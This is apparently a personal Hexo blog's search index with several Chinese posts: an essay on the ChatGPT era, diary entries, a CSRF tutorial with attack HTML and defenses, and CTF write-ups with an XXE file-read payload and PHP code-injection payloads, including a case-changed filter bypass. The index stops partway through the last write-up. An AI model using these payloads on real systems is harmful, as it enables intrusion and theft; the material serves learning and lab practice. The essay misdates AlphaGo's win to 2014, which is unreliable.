<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Chat GPT--AI时代来临</title>
    <url>/2023/01/03/AI%E6%97%B6%E4%BB%A3%E6%9D%A5%E4%B8%B4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>世界在发展，被抛弃的，是不跟随的人。</p>
<span id="more"></span>
<h1 id="新时代的标志"><a href="#新时代的标志" class="headerlink" title="新时代的标志"></a>新时代的标志</h1><p>未来将会是AI的天下，我认为这毋庸置疑。<br>让我们来回顾一下吧。暂且不说那些比较久远且人们没什么印象的事件了。</p>
<ol>
<li>2014年，谷歌推出了“AlphaGo”，这是一种基于深度学习的围棋AI，它成功击败了世界围棋冠军李世石。</li>
<li>2022年，AI绘画出现在大众眼中，并且迅速改变人们对于AI绘画的看法。</li>
<li>2022年11月，Chat GPT被推出，迅速引爆整个互联网，两个月注册次数已经超过了1亿次。</li>
</ol>
<p>这是近年来比较为大众所知的事件。可以明显看出，AI在大众面前出现得越来越频繁，且正在逐渐改变人们的认知与使用方式。<br>我们知道，AI是为了提高工作效率和质量并减少人力成本而被创造出来的，现在这个目的正在逐步成为现实。这也意味着，有大量的人将不再被需要，未来人与人之间的竞争将更加激烈。为了避免自己最终沦落到那个地步，必须紧跟时代步伐！<br>如果说，2014年AI终结了围棋只是一个方面的应用，那么2022年出现的AI正在逐渐渗透到各个领域。要么被抛弃，要么驾驭AI。我们别无选择。</p>
<h1 id="需要改变的人"><a href="#需要改变的人" class="headerlink" title="需要改变的人"></a>需要改变的人</h1><p>哪些人需要改变，顺应时代的变化呢？</p>
<h2 id="年龄层面"><a href="#年龄层面" class="headerlink" title="年龄层面"></a>年龄层面</h2><p>首先，从年龄层面来说，我认为<strong>60岁以下</strong>的人都非常需要重视AI。划分60岁这个年龄段，是因为大多数人在60岁左右退休或是无法再投注更多精力到事业上。<br>并不是说60岁以上的人就不需要在意，他们也需要去在意，因为从目前来看，<strong>Chat GPT 3.0</strong>实际上已经是一个能够基本满足日常使用的AI了，搜索资料，解答问题，聊天唠嗑，甚至帮助完成一些方面的事务也是能够做到的。<br>60岁以上的人需要了解的方式，是和60岁以下的人不同的。区别在于，中老年人更多是需要了解如何使用，在日常生活中获得更多便利。而60岁以下的绝大多数人，了解使用方式只是入门，还必须利用AI来更高效地学习工作。避免自己被抛弃！</p>
<h2 id="财富多寡"><a href="#财富多寡" class="headerlink" title="财富多寡"></a>财富多寡</h2><p>无论财富多寡，AI都必须要深入了解。富人更需要了解，世界的财富并非一成不变的聚集在某些人手中，不愿改变的人即便暂时拥有财富，最终也会一无所有。因此越来越多的富人家族反而更加去了解前沿的事物。掌握最新的真实消息是避免被时代抛弃的不可或缺的方式之一。AI也一定会成为富人家族重视的前沿科技之一，或用于公司企业，或用于提升教育质量。无论如何，AI一定会被广泛地用于各个方面，没有做不到，只有想不到。<br>普通人的方式更像是挣扎在生存边缘。人一生都在做选择，有时一个选择错误，会导致落后很多，甚至一辈子都落后于人。既然已经知道未来的时代是AI的时代，那就不能坐以待毙！</p>
<h1 id="保持竞争力"><a href="#保持竞争力" class="headerlink" title="保持竞争力"></a>保持竞争力</h1><p>首先需要了解AI的发展趋势，我在这里列出以下6点：</p>
<ol>
<li>深度学习和神经网络技术的发展：深度学习和神经网络技术使人工智能能够以更加人类化的方式理解和处理数据。</li>
<li>自然语言处理技术的发展：自然语言处理技术使人工智能能够理解和生成自然语言，使机器能够与人类更自然地交流。</li>
<li>自动驾驶技术的发展：自动驾驶技术使汽车能够自主驾驶，这将会改变交通运输的方式。</li>
<li>增强现实和虚拟现实技术的发展：增强现实和虚拟现实技术使人类能够更直接地与虚拟世界互动，并可能在许多领域提供新的应用。</li>
<li>机器人技术的发展：机器人技术使机器能够自主完成许多工作，并可能在许多领域提供新的应用。</li>
<li>云计算和大数据技术的发展：云计算和大数据技术使人工智能能够处理更多的数据，从而提高其准确性和效率。</li>
</ol>
<p>接下来是AI很难模仿的技能：</p>
<ol>
<li>创造力：人类具有创造性思维的能力，能够想出新的想法和解决方案。人工智能目前难以模仿这种能力。</li>
<li>关爱他人：人类具有同情心和关爱他人的能力，能够体谅他人的情感并给予帮助。人工智能目前难以模仿这种能力。</li>
<li>表达情感：人类能够用不同的方式表达自己的情感，例如语言、面部表情、肢体动作等。人工智能目前难以模仿这种能力。</li>
<li>在团队中发挥作用：人类能够在团队中发挥作用，通过协作和沟通完成任务。人工智能目前难以模仿这种能力。</li>
<li>思考和决策：人类具有独立思考和决策的能力，能够根据不同的情况做出适当的决策。人工智能目前难以模仿这种能力。</li>
</ol>
<p>然而，随着人工智能技术的发展，这些技能也可能在未来被模仿。因此，为了在人工智能时代中保持竞争力，需要不断学习新技能并发展自己的创造力和独特的技能。<br>最后是如何深度使用AI：</p>
<ol>
<li>学习相关知识：学习人工智能相关的知识，包括机器学习、神经网络、自然语言处理等，可以帮助你更好地理解人工智能的原理和应用。</li>
<li>尝试不同的人工智能工具和平台：使用不同的人工智能工具和平台，如 TensorFlow、PyTorch、Scikit-learn 等，可以帮助你了解人工智能的应用方法和流程。</li>
<li>结合实际应用场景使用人工智能：结合实际的应用场景使用人工智能，如为某个公司制定市场营销策略，为某个医院建立诊断模型等，可以帮助你了解人工智能在实际应用中的效果。</li>
<li>参加相关培训和课程：参加相关的培训和课程，如人工智能开发课程、机器学习课程等，可以帮助你更好地掌握人工智能的应用方法。</li>
<li>参与社区和项目：参与社区和项目，如参加人工智能研讨会、参与开源项目等，可以帮助你与其他人工智能开发者交流经验，并有机会学习新的技能。</li>
</ol>
<p>也就是说，凡是容易被AI模仿学习的，未来都将会轻易被取代。即便比较困难的，也将会淘汰掉大部分底层工作者。<br>举例而言，绘画算是AI学习比较困难的一方面，然而发展到现在的大众程度，虽说不至于无法分辨AI，起码也能让人对生成的AI画作不至于排斥。<br>现如今已有很多对绘画方面有需求的从业者开始放弃画师，转而使用AI绘画降低成本。即使如此AI仍在前进，未来将会不断完善算法，不断达到几乎无法分辨的程度。到那时，除了顶级画师能够胜过AI，其他人要么收入大幅降低，要么转行。更现实的情景是，画师与AI共存，AI不断生成画作，画师从中寻得灵感，或者干脆从AI生成的画作上稍作修改。无法否认的是，源于AI带来的成本降低，画师的人数和收入也会跟着降低。<br>编程方面大量程序员将被取代，这是板上钉钉的事。事实上，刚入门编程时，我就有这种预感了。如今被Chat GPT明确了当的实现了也算是毁灭了所有的幻想。听说已经有一部分程序员因Chat GPT的诞生而丢掉了工作，而未来更强力的AI正在创造中，当大部分企业公司反应过来后将AI大规模应用在工作实践中，没有准备好的人将被无情淘汰。<br>如同工业革命，从传统的手工纺织，最终变成了人使用机器纺织。不断有旧的行业消失，也不断有新的行业产生。社会在变革，但无论如何，机会不属于未准备好的人，唯有保持竞争力，才能留有一席之地。</p>
<h1 id="隐忧"><a href="#隐忧" class="headerlink" title="隐忧"></a>隐忧</h1><p>实际上，当AI被成熟运用后，大部分行业的效率将在现在的基础上提升百倍都不止，我们将很难想象，未来社会的变化有多么快，有多少的朝花夕拾。这颗星球，已很难再容纳如此多的人口了，因为大量的人都比不上AI，没有人愿意雇用效率远低于AI的人。存在最稳定的职业是只有人才能胜任的工作，比如运动员，演员。<br>我曾以为，迁移至另一颗星球会是人们的自发行为，现在看来我错了，这很可能是被迫行为。至2040年，会有大量的底层人找不到合适的工作而被迫开拓火星，并且将一去不复返。这副光景，让我想起了曾经逃难去开发美国西部的人。再过若干年，不难想象，歧视将会从肤色跨越到星球，火星人将是低劣的，地球人将是高贵的。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>历史总是螺旋上升。</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-BUU XXE COURSE 1</title>
    <url>/2023/01/20/BUUCTF-BUU%20XXE%20COURSE%201/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做的第一道XXE外部实体注入。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>根据题目可知，是XXE漏洞类型的题目。<br>打开页面是一个表单，我们先抓包。<br>送到Repeater后，从响应包可以发现，只有username得到返回，于是我们需要对username进行注入。<br>然后在语句 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code> 之下写入这段语句：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>并在标签username内部写入 <code>&amp;admin;</code><br>响应拿到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF跨站请求伪造</title>
    <url>/2022/12/06/CSRF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
<span id="more"></span>
<h1 id="CSRF-概述"><a href="#CSRF-概述" class="headerlink" title="CSRF 概述"></a>CSRF 概述</h1><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对<strong>指定网站的信任</strong>，<strong>CSRF</strong> 利用的是网站对<strong>用户网页浏览器的信任</strong>。</p>
<h1 id="CSRF-攻击原理"><a href="#CSRF-攻击原理" class="headerlink" title="CSRF 攻击原理"></a>CSRF 攻击原理</h1><p><img src="/simg/CSRF_1.png" alt="CSRF攻击原理"></p>
<ol>
<li>用户输入账号信息请求登录A网站。</li>
<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客便可尝试进行目标操作。<br>两个条件：</li>
</ol>
<ul>
<li>用户访问站点A并产生了cookie</li>
<li>用户没有退出A并且访问了站点B</li>
</ul>
<h1 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h1><h2 id="HTTP-GET-型"><a href="#HTTP-GET-型" class="headerlink" title="HTTP GET 型"></a>HTTP GET 型</h2><p>这类攻击非常简单，只需要一个HTTP请求：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://a.com</code> 发出一次HTTP请求。<code>http://a.com</code> 就会收到包含受害者登录信息的一次跨域请求。</p>
<h2 id="HTTP-POST型"><a href="#HTTP-POST型" class="headerlink" title="HTTP POST型"></a>HTTP POST型</h2><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;airing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。</p>
<h2 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h2><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://a.com/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"> 屠龙宝刀，点击就送！ </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。</p>
<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><ol>
<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</li>
<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
</ol>
<h2 id="使用burp快速生成CSRF-poc"><a href="#使用burp快速生成CSRF-poc" class="headerlink" title="使用burp快速生成CSRF poc"></a>使用burp快速生成CSRF poc</h2><p>当我们发现一个页面存在CSRF漏洞后，可以通过burp快速生成攻击代码<br><img src="/simg/csrf_2.png" alt=" "><br>点击复制html ，然后保存在本地<br><img src="/simg/csrf_3.png" alt=" "><br>双击打开，当受害者点击就执行了我们的CSRF代码<br><img src="/simg/csrf_4.png" alt=" "></p>
<h1 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h1><h2 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h2><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
<h2 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h2><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
<h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><p>二次验证，就是在转账等关键操作之前提供当前用户的密码或验证码。可有效防御CSRF攻击。</p>
<h2 id="令牌同步模式"><a href="#令牌同步模式" class="headerlink" title="令牌同步模式"></a>令牌同步模式</h2><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。<br>Django框架默认带有STP功能：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>渲染后的效果如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrfmiddlewaretoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（英语：session）等级的令牌代替的话，服务器的负担将没有那么重。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多内容没写，一些是因为现在用不到，一些是看不懂，等以后知识丰富了再来补充吧~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a><br><a href="https://zhuanlan.zhihu.com/p/398601816">Web漏洞之CSRF</a></p>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>锦瑟</title>
    <url>/2022/11/05/Diary_1105/</url>
    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
<span id="more"></span>

<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
</li>
<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
</li>
<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
</li>
<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
</li>
<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
</li>
</ol>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>惜</title>
    <url>/2022/11/06/Diary_1106/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFHUB-find_it</title>
    <url>/2022/12/15/CTFHUB-find_it/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>扫描<br>首先拿DirBuster扫描工具扫一下，发现robots.txt<br>访问robots.txt文件，发现了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want: 1ndexx.php</span><br></pre></td></tr></table></figure>
<p>但是当我们访问时却失败，于是用工具扫一下缓存<br>得到:1ndexx.php.swp访问成功</p>
</li>
<li><p>分析尝试<br>进入后呈现了一堆代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background-color: white;</span><br><span class="line">		text-align: center;</span><br><span class="line">		padding: <span class="number">50</span>px;</span><br><span class="line">		font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">#logo &#123;</span></span><br><span class="line">		margin-bottom: <span class="number">40</span>px;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">	&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">		&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们看到里面有get型传参code，并且设置了严格的过滤，以及字符长度小于34。<br>传参的code可以写入hack文件。而且flag就在hack文件中<br>当我们直接尝试访问时却无法访问hack.php，这是文件被隐藏了。<br>因为可以写入33个字符的代码，于是我们可以思考写入一段显示hack文件源码的代码。</p>
</li>
<li><p>破解<br>以下有三种方法：</p>
</li>
</ol>
<ul>
<li><p><strong>直接写入 phpinfo()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
</li>
<li><p><strong>show_source()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure>
<p>之后便可直接访问hack.php<br>得到flag</p>
</li>
<li><p><strong>System()</strong><br>代码中preg_match并没有忽略大小写，而php函数是可以忽略大小写的，所以可以使用System()来绕过正则检查</p>
